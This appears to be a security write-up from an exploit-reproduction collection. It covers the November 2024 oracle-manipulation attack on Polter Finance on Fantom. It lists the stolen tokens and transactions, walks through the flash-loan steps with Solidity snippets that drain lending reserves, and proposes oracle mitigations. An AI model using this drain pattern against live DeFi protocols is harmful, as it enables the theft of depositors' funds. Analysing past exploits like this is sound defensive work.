# Exploited Polter Finance
- **Type:** Exploit
- **Network:** Fantom
- **Total lost:** ~ 8.7 M 
- **Category:** Oracle Manipulation
- **Vulnerable contracts:**
- - [0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5](https://ftmscan.com/address/0x867fAa51b3A437B4E2e699945590Ef4f2be2a6d5#code)
- **Tokens Lost**
- - 9,129,844 WFT
- - 26.69     BOO
- - 475.24    WSOL
- - 0.23      WBTC
- - 10.96     WETH
- - 8763      MIM
- - 56,881    USDC
- - 1,997,342 sFTMX
- - 26,002    axlUSDC
- **Attack transactions:**
- - [0x5118df23e81603a64c7676dd6b6e4f76a57e4267e67507d34b0b26dd9ee10eac](https://ftmscan.com/tx/0x5118df23e81603a64c7676dd6b6e4f76a57e4267e67507d34b0b26dd9ee10eac)

- - Deployer EOA: [0x511f427Cdf0c4e463655856db382E05D79Ac44a6](https://ftmscan.com/address/0x511f427Cdf0c4e463655856db382E05D79Ac44a6)

- **Attack Block:**: 97508838 
- **Date:** Nov 16, 2024
- **Reproduce:** `forge test --match-contract Exploit_Polter_Finance -vvv`

## Step-by-step Overview

The Polter Finance protocol's critical vulnerability stemmed from trusting SpookySwap V2/V3 pool prices for their BOO token oracle. This meant the protocol's lending decisions were based on potentially manipulatable price feeds from DEX pools, which the attacker exploited through flash loans. The vulnerability manifested in `ILendingPool.borrow()` function where borrowing power was calculated using these manipulated prices.

Here's how the attacker leveraged this vulnerability:

1. Setup (Get Initial Flash Loan)
    - Flash loan BOO tokens from SpookySwap V3 pool
    - Prepare for subsequent operations with obtained liquidity

2. Additional Liquidity (V2 Flash Swap)
    - Perform V2 flash swap to get additional BOO tokens
    - This provides more tokens for the attack setup

3. Collateral Setup
    - Deposit minimal collateral (1e18 BOO) into Polter Finance

4. Exploit Execution
    - Systematically drain multiple token reserves through uncollateralized borrowing
    - Target high-value tokens in sequence
    - Transfer stolen assets to attacker address

5. Flash Loan Repayment
    - Swap 5000 WFTM back to BOO tokens
    - Repay flash loan obligations
    - Keep remaining stolen assets as profit

## Detailed Description

1. Gets BOO tokens through SpookySwap V3 flash loan to initiate the attack:

```solidity
// Initial flash loan from V3 pool
pairWftmBooV3.flash(address(this), 0, BOO.balanceOf(address(pairWftmBooV3)), "");

// Flash callback handling
function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    uint256 repay = BOO.balanceOf(address(this)) + fee1;
    // Further attack steps...
}
```

2. Leverages V2 flash swap to obtain more BOO tokens:

```solidity
pairWftmBooV2.swap(0, BOO.balanceOf(address(pairWftmBooV2)) - 1e3, address(this), "0");

// V2 callback implementation
function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    BOO.approve(address(Lending), 1e18);
    // Initialize exploit sequence...
}
```

3. Sets up minimal collateral and exploits borrowing mechanism:

```solidity
unction exploitToken(IERC20 token) public {
    // Get reserve data for target token
    ILendingPool.ReserveData memory reserveData = Lending.getReserveData(address(token));
    // Execute uncollateralized borrow
    Lending.borrow(address(token), token.balanceOf(reserveData.aTokenAddress), 2, 0, address(this));
    // Transfer stolen tokens
    token.transfer(address(this), token.balanceOf(address(this)));
}

```

4. Systematically drains multiple token reserves:

```solidity
// Execute exploit across multiple tokens
exploitToken(WFTM);
exploitToken(MIM);
exploitToken(sFTMX);
exploitToken(axlUSDC);
exploitToken(WBTC);
exploitToken(WETH);
exploitToken(USDC);
exploitToken(WSOL);
```

5. Repays flash loans and finalizes profit

```solidity
function swapWftmToBoo(uint256 _amountOut) internal {
    address[] memory path = new address[](2);
    path[0] = address(WFTM);
    path[1] = address(BOO);
    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        _amountOut, 0, path, address(this), block.timestamp + 3600
    );
}

```


## Possible mitigations

1. Implement decentralized oracles with multi-source price feeds to prevent price manipulation.
2. Use TWAP oracles to protect against flash loan attacks and price volatility.

## Sources and references

- [@0xNickLFranklin tweet](https://x.com/0xNickLFranklin/status/1858402633935126969)
- [@Bcpaintball26 tweet](https://x.com/Bcpaintball26/status/1857865758551805976)
